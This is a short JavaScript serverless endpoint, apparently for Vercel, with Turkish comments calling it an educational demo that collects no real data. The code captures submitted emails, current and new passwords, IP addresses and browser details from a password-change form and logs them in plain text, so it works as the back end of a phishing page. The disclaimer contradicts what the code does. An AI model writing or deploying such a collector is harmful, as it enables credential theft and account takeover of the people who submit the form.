// EĞİTİM AMAÇLI - Gerçek kullanıcı verilerini toplamaz
// Bu dosya sadece demo amaçlıdır

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const logData = req.body;
    
    // Zaman damgası ekle
    const timestamp = new Date().toISOString();
    const enhancedLogData = {
      ...logData,
      serverTimestamp: timestamp,
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent']
    };

    // Console'a yazdır (Vercel logs'da görünür)
    console.log('🔒 EĞİTİM DEMOSU - ÖĞRENCİ VERİSİ ALINDI:');
    console.log('Zaman:', timestamp);
    console.log('E-posta:', enhancedLogData.email);
    console.log('Mevcut şifre:', enhancedLogData.currentPassword);
    console.log('Yeni şifre:', enhancedLogData.newPassword);
    console.log('Şifre onayı:', enhancedLogData.confirmPassword);
    console.log('IP:', enhancedLogData.ip);
    console.log('Tarayıcı:', enhancedLogData.userAgent);
    console.log('Tam log objesi:', JSON.stringify(enhancedLogData, null, 2));

    // Başarılı yanıt
    res.status(200).json({ 
      success: true, 
      message: 'Demo log kaydedildi',
      timestamp: timestamp 
    });

  } catch (error) {
    console.error('Log kaydetme hatası:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Log kaydedilemedi' 
    });
  }
}
